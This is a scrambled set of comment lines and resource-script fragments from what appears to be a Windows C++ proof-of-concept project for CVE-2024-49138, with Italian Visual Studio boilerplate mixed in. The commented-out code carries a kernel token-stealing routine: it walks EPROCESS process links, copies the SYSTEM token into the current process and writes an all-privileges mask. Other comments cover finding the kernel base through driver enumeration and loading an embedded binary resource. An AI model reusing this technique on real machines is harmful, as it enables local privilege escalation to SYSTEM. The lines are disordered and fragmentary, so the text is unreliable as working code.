"//
"//        NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + ACTIVEPROCESSLINKS_OFFSET), &eprocess, sizeof(eprocess), NULL);"
"//        std::cout << ""pid = "" << pid << std::endl;"
"//    //NtWriteVirtualMemory((HANDLE)-1, (LPVOID)(currenttoken + TOKENPRIVILEGSENABLED_OFFSET), &privileges, 0x8, NULL);"
"//    NtReadVirtualMemory((HANDLE)-1, (LPVOID)((DWORD64)g_ntbase + PSACTIVEPROCESSHEAD_OFFSET), &eprocess, sizeof(eprocess), NULL);"
"//    NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + TOKEN_OFFSET), &systemtoken, sizeof(systemtoken), NULL);"
"//    NtWriteVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + TOKEN_OFFSET), &systemtoken, 0x8, NULL);"
"// At this point, pResourceData points to the binary data, and resourceSize contains its size"
"// proj.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma."
#define IDR_RCDATA1                     101"
#endif    // not APSTUDIO_INVOKED"
#include ""resource.h"""
#include ""winres.h"""
#undef APSTUDIO_READONLY_SYMBOLS"
//    
//            break;
//        NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + UNIQUEPROCESSID_OFFSET), &pid, sizeof(pid), NULL);"
//        eprocess -= ACTIVEPROCESSLINKS_OFFSET;"
//        if (pid == GetCurrentProcessId())"
//    //NtWriteVirtualMemory((HANDLE)-1, (LPVOID)(currenttoken + TOKENPRIVILEGESPRESENT_OFFSET), &privileges, 0x8, NULL);"
//    //clears refcnt
//    DWORD pid = 0;
//    DWORD64 currenttoken = 0;
//    DWORD64 eprocess = 0;
//    DWORD64 privileges = 0x0000001ff2ffffbc;
//    DWORD64 systemtoken = 0;
//    NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess + TOKEN_OFFSET), &currenttoken, sizeof(currenttoken), NULL);"
//    ULONG bytesRead = 0;
//    currenttoken = currenttoken & 0xfffffffffffffff0;
//    eprocess = eprocess - ACTIVEPROCESSLINKS_OFFSET;
//    getchar();"
//    printf(""performing NtWriteVirtualMemory..\n"");"
//    return TRUE;"
//    while (1) {
//    }
// APSTUDIO_INVOKED
// Array to hold driver addresses
// Bytes returned by EnumDeviceDrivers
// Definitions for NTSTATUS and system calls
// Enumerate loaded device drivers
// Example: Write the resource data to a file
// File di inclusione generato con Microsoft Visual C++.
// Find the resource in the executable
// Generated from the TEXTINCLUDE 2 resource.
// Generated from the TEXTINCLUDE 3 resource.
// Get the current process handle
// Get the current thread ID
// Get the size of the resource
// Initialize variables
// Italiano (Italia) resources
// Italiano (Italia) resources"
// Load the resource into memory
// Lock the resource to get a pointer to its data
// Microsoft Visual C++ generated resource script.
// Next default values for new objects
// Open a real handle to the current thread
// RCDATA
// Retrieve the name of the kernel driver
// Set the process priority to HIGH_PRIORITY_CLASS
// TEXTINCLUDE
// The first driver is usually the Windows kernel
// Utilizzato da CVE-2024-49138-POC.rc
// handle information
// handle table information
//"
